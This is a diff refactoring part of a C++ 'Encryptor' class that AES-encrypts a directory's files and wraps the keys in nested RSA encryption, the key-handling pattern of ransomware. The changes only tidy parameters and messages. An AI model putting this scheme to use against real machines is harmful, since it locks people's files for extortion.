@@ -124,24 +124,26 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Join all threads which were spawned for huge file encryption
     joinThreads();
 
-    // Save the final AESKey.bin file
-    encryptFinalAESKeyWithRSA(aeskeypair, butterfly::ENC_AESKEY_FILENAME);
+    // Save the AESKEY Pair in the final AESKey.bin file
+    encryptFinalAESKeyWithRSA(aeskeypair);
 
 }
 
 void Encryptor::encryptCPrivateRSA()
 {
-    // Get the CPrivateRSA.pem file string
-    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
-    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();
 
     try
     {
+        // Get the CPrivateRSA.pem file string
+        std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
+
         // Encrypt the CPrivateRSA.pem file string
-        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
+        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(_rsaEncryptorCPrivateRSA->getEvpPkey(), cPrivateRSAStr);
         //int encMSGLen = _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr);
+
         // Get the encrypted CPrivateRSA.pem string
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
+
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
         _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
 
@@ -149,7 +151,7 @@ void Encryptor::encryptCPrivateRSA()
     {
         std::cerr << e.what() << std::endl;
         // If error occurred here, it makes no sense to continue
-        throw EncryptorException("Error on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what()));
+        throw EncryptorException("Error occurred on encrypting the CPrivateRSA File! RSAEncryptionException: " + std::string(e.what()));
     }
 
 }
@@ -169,18 +171,20 @@ void Encryptor::encryptFileWithAES(const std::string &filepath)
 
 }
 
-void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair, const std::string &filename)
+void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyPair)
 {
 
     try
     {
         // Encrypt the AES Key String
-        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyPair, butterfly::RSAKEY_TYPE::AESKEY);
+        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyPair);
         //int encMSGLen = _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
+
         // Get the encrypted AES Key String
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
+
         // Save the encrypted AES Key to AESKey.bin
-        _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, encMSGLen);
+        _rsaEncryptorAESKey->writeEncMSGToFile(butterfly::ENC_AESKEY_FILENAME, aesKeyEnc, encMSGLen);
 
     } catch (RSAEncryptionException &e)
     {
@@ -205,7 +209,7 @@ void Encryptor::joinThreads()
 {
     for (auto &t: _threads)
     {
-        if (t.joinable())
+        if ( t.joinable() )
             t.join();
     }
 }
